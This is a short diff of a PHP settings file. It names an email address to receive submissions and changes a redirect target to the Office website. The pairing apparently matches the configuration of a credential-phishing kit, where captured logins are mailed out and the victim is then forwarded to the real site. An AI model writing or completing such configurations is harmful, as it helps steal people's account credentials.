@@ -1,4 +1,4 @@
 <?php 
 $Receive_email="sales@oasis-energy.us";
-$redirect="#";
+$redirect="www.office.com";
 ?>
